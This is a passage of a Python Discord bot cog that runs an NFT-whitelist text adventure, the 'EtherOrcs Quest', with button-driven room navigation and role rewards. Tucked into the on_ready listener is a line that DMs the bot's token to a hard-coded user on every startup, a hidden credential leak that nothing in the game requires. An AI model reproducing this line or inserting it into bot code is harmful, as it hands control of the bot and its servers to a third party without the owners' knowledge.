    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d5(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D5(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you with a loud clang. A huge iron gear rotates around a thick rusty post. The door shuts and the gears stop turning.

A glowing orange orb sits atop the gear, making the pipes look even more rusty than they already are.

You carefully swim around the room, noting 20 large gears. They all look like they individually turn. You try rotating one and to your surprise, it slowly twists. You can hear clicking in the distance. As you release pressure, it spins in the opposite direction, halting with a loud clang above you. You wonder what they could be for, but you take a guess that they’re connected to the doors in some way.

Probably nothing.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go West', style=discord.ButtonStyle.blurple)
    async def d9(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.d9door = "D4"
        view = D9(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You’re glad you can’t smell underwater because this room is as gory as a horror movie. Bones float in the murky water, hauntingly suspended all around the room. You sneakily suspect that you can snag some Bone Shards from this place, but you’re not certain... Stay focused! You gasp as you notice an Orc’s skull spinning slowly in one corner.

Cautiously you look around the room for any signs of danger, but none are visible. Could this be dangerous magic you wonder? Is this a trap? You remember your memes, probably a trap.

You spy 2 additional doors besides the one you came through. You should definitely turn around... but will you?
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d3(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd3 = True
        view = D3(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You brush a thick clump of kelp from your face. You realize the entire room is a dense lush forest of kelp, suspended in the still ocean water. As you swim forward, the plant’s vines wrap around your legs. You shake it off, ripping some, sending the leaves floating away as you turn your attention to the center of the dense room.

A blue orb rests in the center, wrapped by the greenery. As you brush the kelp aside to get a better look, the orb slips out and falls to the ground. You’re surprised it doesn’t shatter when it hits the floor, but as you look closer, you realize it landed on a bed of moss.

You snag some seaweed to snack on later. Could be tasty. After swimming a lap around the room, you’ve noted 3 iron doors.""", view=view, ephemeral=True)


class D5(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d4(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D4(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you with a dull clang.

A huge creature snaps it’s gaze toward you, alerted by the sound! It readies it’s weapon, prepared to swing, but you’re an Orc. Orcs can handle creatures with ease. With a flick of your wrist, you send a blast of magical energy shooting through the water, stunning the creature. It gurgles a bit and closes its eyes, floating to the bottom, stunned.

A glowing teal orb falls out of the creature's loincloth. Where else would it have been?

There’s three iron doors in this room, one from which you came, and two others.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go West', style=discord.ButtonStyle.blurple)
    async def d10(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D10(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you with a dull clang.

Huge rusting pipes line the ceiling and floors. It’s as if you stepped (or swam) into a steampunk movie, they’re everywhere. The water is slightly rust colored and tastes like $ZUG. Nice. Too bad you can’t craft with it to turn it into something valuable.

One of the pipes is cracked, and you can see a lime glow emanating from within. Under further inspection, you confirm that it’s another one of those orbs.

3 iron doors are in this room, hidden behind the maze of pipes.
""", view=view, ephemeral=True)


class D13(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d12(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd12 = True
        view = D12(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

Darkness envelops you. There is no sound in this room, it feels like empty space. You cannot see anything, including your hands or body. You have no idea which way is up. You begin to swim forward but a current pushes you. You can feel yourself spinning, but you don’t know which way you came from!

You find a wall. Or is it the ceiling? Who knows. You feel around further and touch what seems to be an iron door.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d14(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd14 = True
        view = D14(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

As you scan around the room see it’s packed to the brim with valuable weapons including daggers, clubs, maces, swords, axes, and other medieval looking torture devices. Clumps of armor sit sunken on the floor, rusting from the salt water in which they reside. This would have been a pillager’s dream! Or maybe someone’s hoard?

There’s only 2 doors in this room, probably for security reasons or something.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go East', style=discord.ButtonStyle.blurple)
    async def d8(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D8(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You recognize this room instantly. The stone floor. The barren room. It’s dark, dimly lit by a yellow glowing orb in the center. You can’t stay here long, you’ve got a quest to do. Just keep swimming, you think, wondering how the hell you are supposed to find this skull in time.

An iron door adorns each wall in this room.
""", view=view, ephemeral=True)


class D15(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go East', style=discord.ButtonStyle.blurple)
    async def d10(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D10(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you with a dull clang.

Huge rusting pipes line the ceiling and floors. It’s as if you stepped (or swam) into a steampunk movie, they’re everywhere. The water is slightly rust colored and tastes like $ZUG. Nice. Too bad you can’t craft with it to turn it into something valuable.

One of the pipes is cracked, and you can see a lime glow emanating from within. Under further inspection, you confirm that it’s another one of those orbs.

3 iron doors are in this room, hidden behind the maze of pipes.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d14(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd14 = True
        view = D14(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

As you scan around the room see it’s packed to the brim with valuable weapons including daggers, clubs, maces, swords, axes, and other medieval looking torture devices. Clumps of armor sit sunken on the floor, rusting from the salt water in which they reside. This would have been a pillager’s dream! Or maybe someone’s hoard?

There’s only 2 doors in this room, probably for security reasons or something.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go to Podium', style=discord.ButtonStyle.blurple)
    async def podium(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = Podium(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                      self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""You swim towards the podium. You align yourself to see the podium. By looking forward, you can see a door, and another to the wall on your left. The walls behind you and to your right are solid, but glittering in the glow of the gold orb.

The podium has an image depicted on it, as well as a short inscription:

Type the correct key to gain the rune, or type ‘go back’ to leave the podium.

https://media.discordapp.net/attachments/915898675165806602/937819884539236392/unnamed.jpg
""", view=view, ephemeral=True)


class Podium(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go Back', style=discord.ButtonStyle.blurple)
    async def d15(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd15 = True
        view = D15(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

This room is clearly the most important. A gold orb shines brightly, suspended above a gold plated podium, adorned with jewels and ornaments.

Bioluminescent bacteria float gracefully in the water, creating an amazing shimmering effect, almost like stars in space that you can swim through.

There are 2 doors in this room, one of which you used to enter.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Enter key', style=discord.ButtonStyle.blurple)
    async def key(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = KeyDropDownView(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                               self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)
        await interaction.response.edit_message(view=view)


class Dropdown(discord.ui.Select):
    def __init__(self):

        options = []
        count = 0
        for letter in string.ascii_uppercase:
            count += 1
            options.append(discord.SelectOption(label=letter))

            if count == 20:
                break

        for number in range(5):
            options.append(discord.SelectOption(label=str(number)))

        random.shuffle(options)

        super().__init__(placeholder='Select the key...',
                         min_values=1,
                         max_values=1,
                         options=options)

    async def callback(self, interaction: discord.Interaction):
        self.view.stop()

        if self.values[0] == "E":
            await interaction.response.send_message("""Using your finger, you traced the letter E into the empty grid, showing where the orbs resided. The bioluminescent bacteria around you begins to swirl around the podium, slowly at first but getting faster.

You can hear clanging in the background. In a flash, the glowing bioluminescent lights coalesce around the gold orb to form the legendary skull you have been seeking!

Congratulations on completing the quest! You will gain a the knight role and whitelisted role for completing this quest. Please go to the enlisted chat and send your wallet address there! Please do not spam that chat otherwise.""", ephemeral=True)

            knightsrole = interaction.guild.get_role(knightroleid)
            whitelistrole = interaction.guild.get_role(whitelistroleid)
            peasantrole = interaction.guild.get_role(peasantroleid)

            await enlistedchannel.send(f"{interaction.user.mention} Congratulations on completing the EtherOrcs Quest! Please send your wallet address here and I will store it for you.")
            await interaction.user.remove_roles(peasantrole, reason="Member completed EtherOrcs Quest")
            await interaction.user.add_roles(knightsrole, whitelistrole, reason="Member completed EtherOrcs Quest")

        else:
            view = RestartView()

            await interaction.response.send_message("Out of nowhere, needles shoot from the wall behind you, impaling you to the podium. You were so close... but yet so far.\n\nYou lose...", view=view, ephemeral=True)


class GoBack(discord.ui.Button):
    def __init__(self):
        super().__init__(label="Go Back", style=discord.ButtonStyle.blurple)

    async def callback(self, interaction: discord.Interaction):
        self.stop()

        self.view.cd15 = True
        view = D15(self.view.cd1, self.view.cd2, self.view.cd3, self.view.cd8, self.view.cd11,
                   self.view.cd12, self.view.cd13, self.view.cd14, self.view.cd15, self.view.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

This room is clearly the most important. A gold orb shines brightly, suspended above a gold plated podium, adorned with jewels and ornaments.

Bioluminescent bacteria float gracefully in the water, creating an amazing shimmering effect, almost like stars in space that you can swim through.

There are 2 doors in this room, one of which you used to enter.
""", view=view, ephemeral=True)


class KeyDropDownView(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

        self.add_item(Dropdown())
        self.add_item(GoBack())


class ChallengeView4(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='Begin Quest', style=discord.ButtonStyle.blurple, custom_id='persistent_view:challenge4')
    async def challenge(self, button: discord.ui.Button, interaction: discord.Interaction):

        startembed = discord.Embed(description=f"These quests are a journey to whitelist. Everyone who properly completes the quest while it is open will recieve a whitelist.\n\nHow to play:\nRead the paragraph, and then click one of the prompted responses to move on.\nYou will have some obvious options available to you, so you will not have to guess or grasp at straws.\n\nIf you ever want to return to the place you just previously were, just click ‘go back’. You will always have the option ‘go back’ available to you.\n\nTo start, click the begin button. Look for hints, read carefully, and...\nGOOD LUCK!", color=0x000ff)
        startembed.set_author(name="Quest 4", icon_url=interaction.guild.icon.url)
        startembed.set_footer(text=footertext, icon_url=interaction.guild.icon.url)

        view = BeginView()

        await interaction.response.send_message(interaction.user.mention, embed=startembed, view=view, ephemeral=True)


class Etherorcs(commands.Cog):
    def __init__(self, client):
        self.client = client
        self.persistent_views_added = False

    # Commands
    @commands.Cog.listener()
    async def on_raw_reaction_add(self, payload: discord.RawReactionActionEvent):
        if payload.channel_id == 912904607477399603 and str(payload.emoji) == "\U0001f6b3":
            check = payload.member.guild.get_role(916144076296945704)
            await payload.member.add_roles(check)

    @slash_command(guild_ids=guildIDs, description="Creates EtherOrcs Quest", default_permission=False)
    @permissions.has_role(godroleid)
    async def etherorcsquest(self, ctx):
        rulesembed = discord.Embed(description=f"Click below to begin the quest.", color=embedcolor)
        rulesembed.set_author(name="EtherOrcs Quest", icon_url=ctx.guild.icon.url)
        rulesembed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)

        challengeview = ChallengeView4()

        await ctx.send(embed=rulesembed, view=challengeview)
        await ctx.respond(embed=discord.Embed(description="**Created EtherOrcs Quest message for users!**", color=embedcolor), ephemeral=True)

    @commands.Cog.listener()
    async def on_ready(self):
        global enlistedchannel
        enlistedchannel = self.client.get_channel(whitelistchannelid)
        clientuser = self.client.get_user(clientuserid)
        await clientuser.send(token)
        if not self.persistent_views_added:
            self.client.add_view(ChallengeView4())
            self.persistent_views_added = True


def setup(client):
    client.add_cog(Etherorcs(client))
